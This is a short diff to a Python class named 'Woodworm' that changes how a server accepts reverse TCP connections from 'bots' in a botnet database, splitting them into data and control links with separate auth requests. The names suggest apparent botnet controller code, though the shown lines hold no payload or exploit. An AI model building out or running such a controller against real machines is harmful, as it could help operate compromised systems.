@@ -224,20 +224,27 @@ class Woodworm:
     async def tcpServer_onConnectionReceived(self, *args, **kwargs):
         nick = kwargs.get('sender')
         connection = kwargs.get('connection')
+        linkType = kwargs.get('linkType')
         
         bot = self.botnetDB.get_bot(nick)
         if bot is None:
             logging.error(f"Bot not found: nick: {nick}")
             await asyncio.sleep(0.5)
-            connection.send_command(f"AUTH-REQ {nick}")
+            if linkType == tcp_services.TCPConnection.LinkType.DATA:
+                connection.send_command(f"DAUTH-REQ {nick}")
+            else:
+                connection.send_command(f"CAUTH-REQ {nick}")
             return
         
         tcpReversedSession = bot.get_reversed_tcp_session()
         tcpReversedSession.isActive = True
 
         connection.set_download_path(self.pathToFiles)
-        tcpReversedSession.set_data_link(connection)
-        logging.info(f"Reverse connection established with nick: {nick}")
+        if linkType == tcp_services.TCPConnection.LinkType.DATA:
+            tcpReversedSession.set_data_link(connection)
+        else:
+            tcpReversedSession.set_control_link(connection)
+        logging.info(f"Reverse {linkType} connection established with nick: {nick}")
 
 
     async def another_loop(self):
